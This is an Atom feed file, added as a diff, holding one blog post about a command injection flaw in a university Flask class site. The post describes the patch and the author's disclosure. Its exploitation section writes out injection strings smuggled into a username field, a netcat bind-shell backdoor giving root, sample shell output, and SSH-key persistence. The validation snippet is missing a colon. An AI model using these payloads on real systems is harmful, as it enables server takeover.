@@ -1,0 +1,136 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Python | Mark Mossberg's Blog]]></title>
+  <link href="http://blog.mark.lc/blog/categories/python/atom.xml" rel="self"/>
+  <link href="http://blog.mark.lc/"/>
+  <updated>2014-12-11T23:43:57-05:00</updated>
+  <id>http://blog.mark.lc/</id>
+  <author>
+    <name><![CDATA[Mark Mossberg]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[iHackedIT]]></title>
+    <link href="http://blog.mark.lc/blog/2014/03/01/ihackedit/"/>
+    <updated>2014-03-01T14:00:00-05:00</updated>
+    <id>http://blog.mark.lc/blog/2014/03/01/ihackedit</id>
+    <content type="html"><![CDATA[<p><em>Discovering, patching, and exploiting a simple command injection webapp</em></p>
+
+<h2>Introduction</h2>
+
+<p>The university that I study at, <a href="http://neu.edu">Northeastern</a> has an awesome <a href="http://www.northeastern.edu/entrepreneurs/">Entrepreneurs Club</a>. One of the programs that they run is called <a href="http://www.northeastern.edu/entrepreneurs/programs/imadeit/">iMadeIT</a> which is a series of workshops designed to help entrepreneurs with a nontechnical background to learn about web development. This post is going go over a vulnerability I discovered in the iMadeIT class website, how I patched, and how an attacker might exploit it in a real situation.</p>
+
+<h2>Background</h2>
+
+<p>The workshops are taught using <a href="http://flask.pocoo.org/">Flask</a>, a Python microframework for web development known for its simplicity and ease of use for beginners. Students taking the class would sign up at <a href="http://imadeit.nu">imadeit.nu</a>, which would make them an account on the website for class management purposes, but also would interestingly create an account for them on the server running the iMadeIT site as well as allow them to &ldquo;register&rdquo; a TCP port to run their Flask app on. This would allow students to have a live link on the internet so they could show off what they&rsquo;ve been working on to people (instead of just running on localhost) without requiring everyone to have their own server.</p>
+
+<h2>The Vulnerability</h2>
+
+<p>Anyway, the iMadeIT guys open sourced the <a href="https://github.com/imadeitnortheastern/spring2014">code</a> that runs their imadeit.nu website and since it is actually written in Flask which is something I&rsquo;ve been meaning to learn for a while now, I decided to take a look at it to see if I could understand anything.</p>
+
+<p>After poking around in the code for a bit, I noticed this particularly interesting function:</p>
+
+<pre><code class="python">def create(name, password):
+    {...}
+    return os.system('useradd -p {} -s /bin/bash -d /home/{} -m {}'.format(enc_pass, name, name))
+</code></pre>
+
+<p>This is what gives the user their own account on the server. If we trace the function calls, we can see that this function is called from the <code>create_account</code> function. Heavily edited to only show relevant sections, it looks like this:</p>
+
+<pre><code class="python">def create_account():
+    {...}
+    name = request.form['create_username']
+    pw = request.form['create_pw']
+    {...}
+    user.create(name, pw)
+    {...}
+</code></pre>
+
+<p>Notice anything? The username is taken from the webpage form and directly passed into the <code>create</code> function without any type of sanitization, creating a classic <a href="https://www.owasp.org/index.php/Command_Injection">command injection</a> vulnerability. What this essentially means is that it&rsquo;s possible for an attacker to put a specially formatted string in the username field that will allow them to execute arbitrary commands on the server.</p>
+
+<p>For example, under ordinary circumstances, a user might enter &ldquo;mark&rdquo; as their username, so the <code>os.system()</code> call would execute:</p>
+
+<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark -m mark
+</code></pre>
+
+<p>Let&rsquo;s say a user entered &ldquo;mark; ls -l #&rdquo;. Now, <code>os.system()</code> is going to execute:</p>
+
+<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark; ls -l; # -m mark; ls -l #
+</code></pre>
+
+<p>This will create the user &ldquo;mark&rdquo;, but it will also cause <code>ls -l</code> to be executed, which will list the files in the directory. Now the user that entered this in the form isn&rsquo;t going to see anything; the command executes internally on the server. Hopefully you&rsquo;re seeing now why this is bad - anyone can execute any command on the server as the user that is running the Flask app. In this case it&rsquo;s particularly bad, because the app is running on port 80 of the server which is a &ldquo;privileged&rdquo; port. Since only the superuser is allowed to run network services on ports below 1024, essentially anyone now has root access to the server.</p>
+
+<p>As a side note, the &ldquo;#&rdquo; in the injection is there to comment out the rest of the command (the &ldquo;-m&rdquo; part) so it doesn&rsquo;t interfere with the injection.</p>
+
+<h2>Patching</h2>
+
+<p>This is actually a really easy vulnerability to protect against, all that&rsquo;s required is to make sure that that the username and password fields are checked in some form before they are sent to the system call. In this case, we don&rsquo;t have to worry about the password, because it goes through encryption before being used in the system call, so any attempts to inject in the password field would fail when the attacker&rsquo;s injection gets encrypted.</p>
+
+<p>To check the username input, it&rsquo;s important to use a <a href="https://www.owasp.org/index.php/Positive_security_model">positive security model</a> (a whitelist) over a negative one. This is because using a blacklist of specific characters that aren&rsquo;t allowed can be potentially incomplete and leaves the attacker room to find sneaky ways to exploit this vulnerability using alternative characters that aren&rsquo;t in your blacklist. As a general rule, it&rsquo;s better to use a whitelist of only the characters that are permitted. In this case, for a username, let&rsquo;s say that users should only be allowed to have usernames with lowercase letters, uppercase letters, underscores, and periods. Writing a function to check for this would look like this:</p>
+
+<pre><code class="python">import re
+def valid_username(name):
+    if re.search('[^\w.]', name):
+        return False
+    else
+        return True
+</code></pre>
+
+<p>In this particular approach, we aren&rsquo;t <em>really</em> sanitizing the input, we&rsquo;re just checking it&rsquo;s validity. In this case, if this function returned false, the <code>create_account</code> function would fail, and we would show an error to the user. An alternative would be to attempt to correct invalid user input by removing invalid characters, however despite potential UX arguments, I think it&rsquo;s personally better just to halt completely and let the user sort it out on their end.</p>
+
+<h3>Exploiting</h3>
+
+<p>Now that we&rsquo;ve described how the vulnerability works, and how to protect against it, let&rsquo;s dirty our white hats a little and check out some steps an attacker might take once discovering the vulnerability.</p>
+
+<p>First of all, we know that we can execute arbitrary commands on the server as the root user. To most, this pretty much is already the definition of being 0wned. However, doing so is sort of awkward; we have to go to the login form and create a new user for every command we want to execute. Let&rsquo;s use netcat to create a rudimentary backdoor into the system by telling netcat to listen on an arbitrary port (say, 1337) and executing a certain file upon receiving a connection (say, <code>/bin/sh</code>).</p>
+
+<p>This command looks like</p>
+
+<pre><code class="sh">$ netcat -l -p 1337 -e /bin/sh
+</code></pre>
+
+<p>and so our injection would look like</p>
+
+<pre><code class="sh">mark; netcat -l -p 1337 -e /bin/sh &amp; #
+</code></pre>
+
+<p>Notice that I added a &ldquo;&amp;&rdquo; before the &ldquo;#&rdquo; in the injection. This will cause the backdoor to run in the background because otherwise the flask process would stop while the backdoor is running, and the webapp would stop working. Not very stealthy. When we enter this into the create account form, we won&rsquo;t get any sort of confirmation that our backdoor is working, however we&rsquo;ll know soon enough when we test it. To connect, all we need to do is run</p>
+
+<pre><code>$ netcat [ip address] 1337
+</code></pre>
+
+<p>which will attempt to create a simple TCP connection to the IP address of the server on the same port you specified earlier. If it worked, you won&rsquo;t get a prompt, but you&rsquo;ll have a shell that you can enter commands at. With spaces added for ease of reading, this looks like</p>
+
+<pre><code>$ netcat 1.2.3.4 1337
+
+ls
+imadeit.db
+imadeit.py
+schema.sql
+static
+templates
+user.py
+user.pyc
+
+whoami
+root
+
+echo $SHELL
+/bin/bash
+</code></pre>
+
+<p>Now, the server has been totally owned. Next steps could include adding your ssh public key to the <code>~/.ssh/authorized_keys</code> file for enhanced persistence if the server got restarted, or if someone saw your backdoor and killed it. In a situation where the app wasn&rsquo;t running on port 80 and was running on a nonprivileged port instead, you wouldn&rsquo;t necessarily have root access so you would then use a local exploit to escalate privileges. However for this situation, even exploiting this vulnerability at all is sort of pointless because the webapp actually <em>creates an account for you</em> on the server which you can ssh into, and legitimately get a shell.</p>
+
+<h2>Conclusion</h2>
+
+<p>I hope you can see now how even something as simple as checking user input in a webapp can go a long way in securing your web site and making sure you don&rsquo;t get hacked. After discovering the vuln, I submitted a pull request to iMadeIT&rsquo;s repo on github, which was merged and deployed an astonishing <a href="https://github.com/imadeitnortheastern/spring2014/pull/1"><em>5 minutes</em></a> later, so serious props to them for that. I&rsquo;ve never discovered a serious vulnerability &ldquo;in the wild&rdquo; before, so it was sort of cool to go through the process of submitting the patch and then confirming that it was working in the live site.</p>
+
+<p>That&rsquo;s all, thanks for reading!</p>
+]]></content>
+  </entry>
+  
+</feed>
